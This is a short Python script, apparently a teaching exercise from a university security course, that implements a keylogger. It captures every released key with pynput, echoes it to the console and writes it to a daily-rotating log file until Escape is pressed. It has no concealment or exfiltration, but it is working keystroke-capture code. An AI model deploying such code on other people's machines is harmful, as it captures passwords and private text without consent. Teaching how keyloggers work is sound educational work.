# CITS 3004
# Name: Logger
# Authors: Other Lecturers and Alvaro Monsalve
# Last Update: 13 OCT 2021
# Requirements: Python 3.8

from pynput import keyboard
import logging
from logging.handlers import TimedRotatingFileHandler
import time
import os

sol_dir = os.environ['CITS3004_LOGGER_PATH']


logname = sol_dir + "/my_logger.log"
logger = logging.getLogger("my_logger")
logger.setLevel(logging.INFO)
handler = TimedRotatingFileHandler(logname, when="midnight", interval=1)
handler.suffix = "%Y%m%d"
logger.addHandler(handler)

def get_key_name(key):
    if isinstance(key, keyboard.KeyCode):
        return key.char
    else:
        return str(key)

def on_release(key):
    key_name = get_key_name(key)
    print('Pressed: {}'.format(key_name))
    logger.info('Pressed: {}'.format(key_name))
 
    if key_name == 'Key.esc':
        print('Exiting...')
        return False
 
with keyboard.Listener(on_release = on_release) as listener:
    listener.join()